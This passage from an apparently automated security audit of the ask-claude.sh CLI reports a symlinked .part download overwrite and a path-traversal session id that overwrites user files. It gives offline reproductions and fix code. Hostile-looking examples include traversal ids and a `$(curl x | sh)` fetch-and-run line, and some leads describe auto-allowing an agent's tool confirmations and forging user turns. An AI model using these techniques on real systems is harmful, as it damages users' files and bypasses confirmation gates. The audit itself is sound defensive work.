
**Bounded reproduction:**

1. In the sandbox (no external network), create work dir W with report.txt.part -> /scratch/t/victimB.txt, where victimB.txt holds 'precious-B'.
2. Start a loopback Perl HTTP server on 127.0.0.1:18080 that serves the listing and content above (agents/v06/artifacts/t/srv.pl).
3. From W run bash /target/ask-claude.sh with usage_cmd='agent files' usage_session=sesn_FIXTURE01 usage_name=report.txt usage_base_url=http://127.0.0.1:18080 usage_model=m usage_max_tokens=16000 ANTHROPIC_API_KEY=sk-ant-test-not-a-key (agents/v06/artifacts/t/run.sh, case B). Case A repeats this with ASK_CLAUDE_REPLAY set to a replay dir instead of the server.
4. Read victimB.txt and list W.

**Conditions:**

- *data_state*: The download directory already contains <name>.part as a symlink (existing target or dangling) planted by a lower-trust party, for example a committed symlink in a cloned repository or another account in a shared directory not covered by protected_symlinks.
- *user_interaction*: The user runs `ask-claude agent files <sesn> <name>` in that directory, for a session that holds a file whose filename equals <name>. The attacker must predict that name.

**Observed result:** Live curl branch: 'ask-claude: wrote report.txt (15 bytes)', exit 0. The server logged both GETs. victimB.txt changed from 'precious-B' to 'AGENTDATA-CURL', and W/report.txt is now a symlink to /scratch/t/victimB.txt. The replay branch gave the same result (victimA.txt became 'AGENTDATA'). Control: with a plain existing report.txt and no .part symlink, the run is refused with exit 2.

**Impact:** Demonstrated: bytes chosen by the agent or endpoint overwrite, or newly create, an arbitrary file the user can write, outside the cwd. Code execution through a shell rc or a similar file is plausible but was not demonstrated.

**Priority rationale:** The attacker must plant a <name>.part symlink in the exact directory where the user downloads and must predict the session filename the user asks for. The user must then run `agent files` with that name there.

**Smallest source fix:** Write to a temporary file created exclusively with mktemp in the cwd (O_EXCL, so a planted name cannot redirect the write), then rename it onto $name. Refuse when $name is a symlink or any non-regular file, even with --force, so that rename never follows a link or moves the file into a directory. This enforces the invariant at the open instead of extending the existence check, which would remain a check-then-use race.

`ask-claude.sh`:

```bash
  local sesn=$1 page name id size tmp
  ...
    if [ -L "$name" ] || { [ -e "$name" ] && [ ! -f "$name" ]; }; then
      die "$name exists here and is not a regular file; refusing"
    fi
    if [ -e "$name" ] && [ "${usage_force:-}" != true ]; then
      die "$name exists here; --force overwrites it"
    fi
    tmp=$(mktemp "./.${name}.XXXXXX") || die "cannot create a temporary file here"
    if [ -n "${ASK_CLAUDE_REPLAY:-}" ]; then
      cat "$ASK_CLAUDE_REPLAY/files/$name" >"$tmp"
    elif ! curl -sS --fail --max-time 600 "$BASE_URL/v1/files/$id/content" -H @<(ma_headers) -o "$tmp"; then
      rm -f "$tmp"; echo "ask-claude: download of $name failed" >&2; return 1
    fi
    mv -f -- "$tmp" "$name"
```

### 8. API-supplied Managed Agents session id is used as a file name, letting the endpoint overwrite any user-writable file

`ask-claude.sh:session_remember/unvalidated-api-session-id-path`. Severity **low**: likelihood low, impact medium. Confidence: high.

**Source:** `ask-claude.sh:570`, `ask-claude.sh:571`, `ask-claude.sh:782`, `ask-claude.sh:584`

**Lower-trust principal:** An API endpoint that the user configured with --base-url replies to POST /v1/sessions with a traversal id, and replies to the stream GET with an idle end_turn event.

**What goes wrong:** session_create takes .id from the POST /v1/sessions response and checks only that it is non-empty. After a successful turn, session_remember writes agent=/environment=/created= lines to "$SESSIONS/$id". An id with ../ segments escapes $STATE/sessions, and the > redirect truncates and overwrites any file the user can write. With the default ~/.local/state layout, the home directory is 4 levels up, so ~/.bashrc or ~/.ssh/authorized_keys can be reached. The endpoint also controls whether the turn succeeds: the stream URL is built without curl -g, curl normalises the ../ segments out of it, and the request still goes to the same endpoint host, which answers with an idle end_turn event. Both the one-shot path (782-784) and the interactive session_loop (648-649) reach the sink.

**Bounded reproduction:**

1. In the parent sandbox (no network, uid 1000, HOME=/scratch), start a loopback perl fixture on 127.0.0.1:8766. It serves the first payload for POST /v1/sessions and the second payload for any GET .../events/stream (agents/v07/artifacts/sid/srv.pl).
2. Create /scratch/victim.txt containing 'precious user file'.
3. Run bash /target/ask-claude.sh with usage_cmd=agent usage_prompt=hi usage_agent=agent_v07 usage_environment=env_v07 usage_budget=100 usage_max_tokens=16000 usage_model=m usage_base_url=http://127.0.0.1:8766 ANTHROPIC_API_KEY=sk-ant-test-not-a-key (agents/v07/artifacts/sid/run.sh).
4. Read /scratch/victim.txt.

**Conditions:**

- *system_configuration*: The user points --base-url at an https host (or a loopback service) that returns a malicious session id. This can be a hostile, compromised or misconfigured Anthropic-compatible endpoint. The default api.anthropic.com is trusted, so the attack does not apply there unless that service is compromised.
- *user_interaction*: The user starts an agent session (one-shot, or the first line of the session loop).
- *data_state*: The target file is writable by the user, and its depth relative to $STATE/sessions is known (with the default layout, ~ is 4 levels up).

**Observed result:** Exit 0. The fixture saw 'POST /v1/sessions' and 'GET /victim.txt/events/stream'. /scratch/victim.txt changed from 'precious user file' to 'agent=agent_v07\nenvironment=env_v07\ncreated=20261105T194314', and $STATE/sessions stayed empty. The session_loop variant (stdin 'hi' then '/quit', id ../../../../victim2.txt) also exited 0 and overwrote /scratch/victim2.txt the same way.

**Impact:** Any user-writable file at a known relative depth can be truncated and overwritten, for example dotfiles or authorized_keys. That is a loss of integrity and availability. The written content is fixed (the user's own agent and environment ids and a timestamp), so the attack does not give code execution.

**Priority rationale:** The user must target a hostile or compromised API endpoint with --base-url. The default endpoint is trusted.

**Smallest source fix:** Validate the id where it enters (session_create) against the API's id grammar, and refuse to write session state for any other id. As defence in depth, check the id again in session_remember. This enforces the single-component invariant on the API value itself and does not move trust elsewhere. Suggestion, outside this record's root cause: apply the same check before the id is placed in URL paths and before it is printed in the status line.

`ask-claude.sh`:

```bash
  sesn=$(jq -r '.id // empty' <<<"$resp" 2>/dev/null)
  if [[ ! $sesn =~ ^sesn_[A-Za-z0-9_-]{1,128}$ ]]; then
    err=$(api_error "$resp")
    echo "ask-claude: API error: ${err:-unexpected session id}" >&2
    return 1
  fi
  echo "$sesn"
```

`ask-claude.sh`:

```bash
session_remember() {
  [[ $1 =~ ^sesn_[A-Za-z0-9_-]{1,128}$ ]] || return 1
  mkdir -p "$SESSIONS"
  printf 'agent=%s\nenvironment=%s\ncreated=%s\n' "$usage_agent" "$usage_environment" "$(date +%Y%m%dT%H%M%S)" >"$SESSIONS/$1"
}
```

## Needs validation

These are leads, not confirmed vulnerabilities, and they carry no severity. Each needs a fact that the source and the local sandbox cannot provide. The full plans are in `NEEDS-VALIDATION.md`.

| Title | Trace | Blocker | Local next step | Owner-observed check |
|---|---|---|---|---|
| State-dir gate ignores a failed chmod and never checks the owner, so a directory another account owns is accepted and its planted .always.<pid> files auto-allow tool confirmations | `ask-claude.sh:66` → `ask-claude.sh:113` → `ask-claude.sh:118` → `ask-claude.sh:434` | The parent sandbox runs as a single uid (1000), so a second account that owns $STATE and plants .always.<pid> cannot be staged. Locally verified in parts: the real script passes the gate for a uid-0 mode-755 $STATE, and a pre-existing .always.<pid> that the current run did not create turns a no-TTY deny into allow. The two-account chain end to end is not observed. Whether a real user sets XDG_STATE_HOME (or HOME) to a path where another local account can create, own, or symlink the ask-claude directory (for example under /tmp or a shared or network home) is a deployment fact outside source. Without it there is no second principal and no impact. | On a disposable multi-user Linux VM with no network: as account B, mkdir -m 755 /tmp/xs /tmp/xs/ask-claude and touch /tmp/xs/ask-claude/.always.{1..99999}. As account A, with the agents/v08 fixtures copied to /home/A/fx (1.sse ends requires_action with an agent.tool_use for bash; 2.sse ends end_turn), run: usage_model=m usage_max_tokens=16000 usage_cmd=agent usage_agent=agent_X usage_environment=env_X usage_budget=0 usage_prompt=hi ANTHROPIC_API_KEY=sk-ant-test-not-a-key ASK_CLAUDE_REPLAY=/home/A/fx ASK_CLAUDE_REQUEST_LOG=/home/A/reqlog XDG_STATE_HOME=/tmp/xs bash ask-claude.sh </dev/null. Expected if vulnerable: stderr shows 'ask-claude: allowed bash' and reqlog has a user.tool_confirmation with result allow. Control: the same command with an A-owned mode-700 state dir with no .always files prints 'denied ... stdin is not a terminal'. Regression for the fix: the gate must die when stat -c %u "$STATE" differs from id -u, when $STATE is a symlink, or when mkdir/chmod fails. | The owner checks whether any machine or shared host where ask-claude runs sets XDG_STATE_HOME or HOME to a path where another local account can create directories or symlinks (for example a world-writable /tmp subtree or a shared home), and reports the path and its parent ownership and mode. No audit traffic is sent anywhere. |
| One ASK_CLAUDE_MCP_TOKEN is attached to every --mcp server, so each listed server operator can receive the credential meant for another | `ask-claude.sh:101` → `ask-claude.sh:276` → `lib/request.jq:59` → `ask-claude.sh:251` | Whether the provider's MCP connector sends each entry's authorization_token to that entry's server URL (for example as 'Authorization: Bearer <token>') is provider-side behaviour and cannot be observed offline. Locally it is established only that the request body binds the second server to the same token as the first (agents/v10/artifacts/mcp2-result.txt). | Done, bounded and offline: in the sandbox, ASK_CLAUDE_REPLAY=tests/fixtures/sse/text.sse, ASK_CLAUDE_REQUEST_LOG=/scratch/out/req.jsonl, ASK_CLAUDE_MCP_TOKEN=dummy_token_for_private_A, usage_mcp='https://private-a.example/mcp https://public-b.example/mcp', usage_prompt=ping, bash /target/ask-claude.sh; then jq -c '{mcp_servers,tools}' on the log. Result: both mcp_servers entries (private-a-example and public-b-example) carry authorization_token dummy_token_for_private_A. | The owner runs one live one-shot with ASK_CLAUDE_MCP_TOKEN=dummy-not-a-secret and two --mcp URLs, both owner-controlled https endpoints that log request headers and accept the dummy credential. Confirm whether the second endpoint receives 'Authorization: Bearer dummy-not-a-secret'. Use only dummy credentials and owner-controlled endpoints. |

## Hardening notes

These are suggestions, not findings. None crosses a demonstrated trust boundary. The rejected candidate is listed first.

- **`justfile:ask:unquoted-recipe-interpolation` (rejected):** Source confirms the unquoted interpolation, and just's verbatim-interpolation and default `sh -cu` semantics are documented behavior, so the hunter's blocker (just absent from the sandbox) is not decisive. The decisive fact is answerable from source and the architecture: the only writer of `question` and `FLAGS` is the local developer, who is the full-authority principal (architecture: user and operator are the same local developer) and who invokes the recipe from their own shell. No lower-trust actor (API endpoint, model output, MCP server, commit author) controls the argument, so SUPPLY-CHAIN-AND-RELEASE validation rule 1 is not met and the command that runs has exactly the authority the user already exercises by typing it. The remaining scenario, a user pasting attacker-authored text such as `$(curl x | sh)` into `just ask '...'`, requires the victim to place the payload on their own command line in a repo-local developer convenience recipe that is not the installed CLI; that is a footgun, not a vulnerability crossing a boundary. Keep as a hardening/correctness note: change line 7 to `./ask-claude.sh {{ FLAGS }} {{ quote(question) }}` (or use [positional-arguments] with `"$@"`), which also fixes multi-word questions being split against the single `[prompt]` positional.
- No curl call passes -q, so ~/.curlrc is honoured. The sandbox run confirmed that a curlrc in HOME changes curl behaviour. A user curlrc containing 'location' would make curl follow redirects, and curl resends -H custom headers (x-api-key) to the redirect target, including https-to-http downgrades. Suggest making -q the first curl argument at ask-claude.sh:251, 381, 384, 401, 668 and 698.
- ASK_CLAUDE_REQUEST_LOG logs request bodies in live mode, not only under ASK_CLAUDE_REPLAY, although the comment at ask-claude.sh:361-363 says it is for replay. The bodies include the MCP authorization_token and the GitHub repository authorization_token. tee -a and >> keep the mode of an existing file: a pre-existing 0644 log stayed 0644 with the token appended. Suggest logging only when ASK_CLAUDE_REPLAY is set, or redacting authorization_token fields, and refusing to append to a file not owned by the user or with group/other permissions.
- tests/record-session.sh:20 uses ASK_CLAUDE_BASE_URL with no scheme or loopback gate, so a live recording sends the key over http to any host. Suggest copying the main script's (fixed) gate.
- --base-url accepts any https host and sends ANTHROPIC_API_KEY to it, and the help text suggests a third-party host (Venice). The help text could warn that the Anthropic key, plus any MCP or GitHub tokens in the body, go to that host.
- Long -f files (over 128 KiB on Linux, MAX_ARG_STRLEN) fail at jq --arg (ask-claude.sh:335) with E2BIG. This is a functional limit that the stdin-based fix for the argv finding also removes.
- session_files: with --force and $name an existing directory, mv -- "$name.part" "$name" (703) moves the download into that directory instead of replacing it; use mv -T (GNU) or refuse non-regular targets.
- session_files: TOCTOU between the -e check (693) and mv (703). A $name created during the download is silently clobbered; mv -n or an exclusive link-based rename would close it.
- session_files: the API file id is interpolated into the URL path without -g or validation (698). This stays on the same host with no -L, so it is not SSRF; validating ^file_[A-Za-z0-9_-]+$ removes path-normalisation surprises.
- State dir: .stream.$$ (480) and .always.$$ (447) are fixed, PID-predictable names created with : > (no O_EXCL). Safe only while the owner gap above is closed; a mktemp-based name would not depend on the gate.
- ask-claude.sh:446-448: 'always' grants every tool and every input for the process (across /new sessions); a grant scoped to the tool name would narrow it.
- ask-claude.sh:439,443,463-464: tool .name is printed without the safe filter; apply safe (strip C0/C1, and consider bidi/zero-width) to name and input in all confirmation messages.
- ask-claude.sh:528: confirmation rounds are uncapped; with ASK_CLAUDE_CONFIRM=allow or an always grant a session can loop tool calls bounded only by the server-side budget (--budget 0 removes it, session-create.jq:37).
- tools/effver/bump-effver:30-37 runs bash arithmetic on the working-copy VERSION without version_re. This is the same sink as the check-effver finding, but the writer has the same trust as the script being run. Add the same version_re guard and 10# arithmetic so a copy pulled into dotfiles is safe.
- check-effver prints commit subjects (line 111) and raw VERSION/heading strings (lines 86, 90) to the terminal unsanitised, so escape sequences in commit content reach the developer's terminal. Strip C0/C1 before printing.
- justfile skills/agents/environments recipes (61, 121, 130) print account-controlled names (display_title, agent and environment names) with jq -r @tsv. @tsv escapes tab, newline, CR and backslash but not ESC or other control characters. Apply a C0/C1 filter as ask-claude.sh `safe` does.
- mise.lock records many checksums with checksum_source="mise-versions", a third-party index rather than an upstream-published digest. The trust root is that index at lock time. Review a `mise lock` diff before committing it.
- Unpinned VS Code extensions in .devcontainer.json (some, such as jjk.jjk, listed twice) install their latest versions at container build time.
- lib/reassemble.jq:43 copies content_block objects verbatim (any extra keys, e.g. a server-sent 'role'), and ask-claude.sh:311-312 persists and resends them. Allowlist block fields per type, or validate before persisting, so that one malformed reply cannot make every later turn of the chat fail with a 400.
- show_history (ask-claude.sh:158-163) renders model text that contains '\nyou: ...' the same as a real user turn, both in /history and on resume. Prefix continuation lines or mark turn boundaries unambiguously.
- tests/record-session.sh:42 id regex (sevt|sesn|agent|env|sthr|vlt)_[A-Za-z0-9]+ matches the key 'agent_name', which defeats the agent_name sed on line 49. Anchor the regex to values (for example, after '":"'), run the agent_name sed before the awk, and add file_ to the redacted prefixes.
- tests/record-session.sh:20 sends the API key to ASK_CLAUDE_BASE_URL without the https/loopback gate that ask-claude.sh:92-96 applies. Copy that gate.
- ask-claude.sh:668 'curl -F file=@$1': curl interprets ';type=', ';headers=@' and ',' inside the path. Reject paths that contain ';' or ',', or quote the filename (file=@"...") after escaping. Unverified locally, because curl cannot run without the network.
- ask-claude.sh:748-755 validates the glob-expanded --vault/--memory words while lib/session-create.jq gets the raw string. Run set -f, or split with read -a, so that the validated and the sent values are identical.
- .devcontainer.json VS Code extensions are not pinned to versions.
- DOLLARS (ask-claude.sh:129) calls `tonumber` on the API's list_cost.amount at lines 537/623/721. Under jq 1.7 the error text echoes the string raw to stderr. jq 1.8.2, which the target pins, JSON-escapes it. Suggestion: validate with test("^[0-9]+(\\.[0-9]+)?$") before tonumber.
- `safe` strips only C0/DEL/C1 codepoints. Unicode format characters (bidi overrides U+202A-U+202E, isolates U+2066-U+2069, U+200B-U+200F) pass through and can visually reorder or hide model text. Suggestion: also drop the Cf category ranges.
- `safe` filters C1 by Unicode codepoint; on a non-UTF-8 8-bit terminal locale, UTF-8 continuation bytes 0x80-0x9F could be read as C1 CSI. Niche; noted only.
- The `safe` definition is duplicated four times (ask-claude.sh:125, lib/stream.jq:29, lib/session.jq:12, lib/session-history.jq:10). Suggestion: a shared lib/safe.jq included with `include`.

### Positive patterns

- **Secrets off curl argv.** The API key reaches curl as `-H @<(headers)` and request bodies go through stdin. The MCP and GitHub tokens are read inside jq through `env.*`. Argv-recording shims confirmed this (v02 and h4).
- **`safe` in every `lib/*.jq` renderer.** In the same sandbox runs where the shell-side sinks leaked escape sequences, the renderers stripped them (h2 and v03).
- **Typed message history.** Server content is always stored under `role: assistant`, so a forged `role` field cannot create a user turn (h6).
- **Fail-closed confirmation.** With no TTY the default is deny, and confirmation answers are bound to the tool-use id (h1).
- **Name filters on user input.** User-supplied chat names, session prefixes and download names all reject `/` and glob characters.
- **No eval or `sh -c` in the CLI, and no curl `-L`.**

## Coverage

Status counts from the ledger: candidate 11, covered 4, deferred 4, out_of_scope 1.

- **Post-wave critic** (after wave 1): proposed 2 missing units, no reassignments. Both were accepted and deferred.
- **Final-clean critic:** proposed 2 more missing units. Both were accepted and deferred. The final critic therefore did **not** return clean.
- **Deferred units** (not reviewed in this run, to be picked up by the next run):

  - `ask-claude.sh#Messages --web --mcp -s -f tool composition` → `lib/request.jq#tools web_search web_fetch mcp_toolset configuration` (AI-AND-LLM.md#Indirect injection through retrieved or ingested content). Reason: critic-w1: web_search/web_fetch without domain limits and unrestricted mcp_toolset carrying the user's token in one request (lib/request.jq:59,63-68), with -f contents in context and pause_turn auto-continue (ask-claude.sh:318); no unit checked client-side tool narrowing
  - `ask-claude.sh#agent --repo --vault --memory session resources` → `lib/session-create.jq#resources credential and memory delegation` (AI-AND-LLM.md#Sub-agent and MCP trust inheritance). Reason: critic-w1: GITHUB_TOKEN delegated unscoped (lib/session-create.jq:24-31), memory stores read-write by default (:32-34), vault_ids passed through (:41); no unit reviewed the delegated authority
  - `ask-claude.sh#session_stream_read stream framing` → `ask-claude.sh#sed substring stop versus jq fold of the same log` (AI-AND-LLM.md#Tool-schema and dispatcher disagreement). Reason: critic-final: session_stream_read (412-419) stops on a raw substring match of "type":"session.status_idle", which a model-chosen tool input object can contain; no unit compared this terminator with the structural fold (lib/session-fold.jq)
  - `tools/effver/check-effver#commit subject, VERSION and CHANGELOG.md heading printed in problem reports` → `tools/effver/check-effver#problem report output to the developer terminal` (ATTACK-CLASSES.md#Injection). Reason: critic-final: check-effver prints commit-controlled subject (111), VERSION (86, 105) and CHANGELOG heading (90) raw to the terminal; no unit covers this output path
- **Out of scope:** `.claude/skills/security-audit/`, the audit tooling.
- **Excluded companions:** web/auth, client-side, desktop/IPC, memory-safety, cloud, protocols/RPC, data-isolation and resource-exhaustion. Each unit records its reason. In short: there is no server, browser, IPC, native code or multi-tenant store.

